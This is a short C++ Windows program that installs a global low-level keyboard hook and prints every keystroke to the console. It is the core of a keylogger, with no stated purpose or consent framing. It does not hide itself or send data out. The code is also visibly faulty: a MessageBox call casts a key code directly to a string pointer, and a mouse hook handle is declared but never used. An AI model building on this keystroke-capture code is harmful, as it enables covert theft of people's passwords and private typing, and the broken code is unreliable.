#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>

#pragma comment(lib, "user32.lib") // user32.dll windows' library

HHOOK g_hook;
HHOOK mouseHook;

// Keyboard hook
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		bool isShiftPressed = ((GetKeyState(VK_LSHIFT) & 0x8000) != 0) || ((GetKeyState(VK_RSHIFT) & 0x8000) != 0);
		bool isCapsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		bool isCtrlPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0) || ((GetKeyState(VK_RCONTROL) & 0x8000) != 0);
		bool isNumLockActive = ((GetKeyState(VK_NUMLOCK) & 1) != 0);
		bool isAltPressed = ((GetKeyState(VK_LMENU) & 0x8000) != 0 || (GetKeyState(VK_RMENU) & 0x8000) != 0);

		int vkCode = pKeyboardStruct->vkCode;

		MessageBox(NULL, (LPCWSTR)(char)vkCode, L"Titolo", 1);

		// if the key is a letter, we can convert it to a char
		if (vkCode >= 0x41 && vkCode <= 0x5A)
		{
			char c = static_cast<char>(vkCode);
			std::cout << c << std::endl;
		}
		else
		{
			// if the key is not a letter, we can convert it to a string
			std::string key = std::to_string(vkCode);
			std::cout << key << std::endl;
		}

	}
	// return control to the Operating System
	return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// main function
int main()
{
	HINSTANCE hInstance = GetModuleHandle(nullptr);
	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

	if (g_hook == nullptr) return EXIT_FAILURE;

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(g_hook);

	return ERROR_SUCCESS;
}
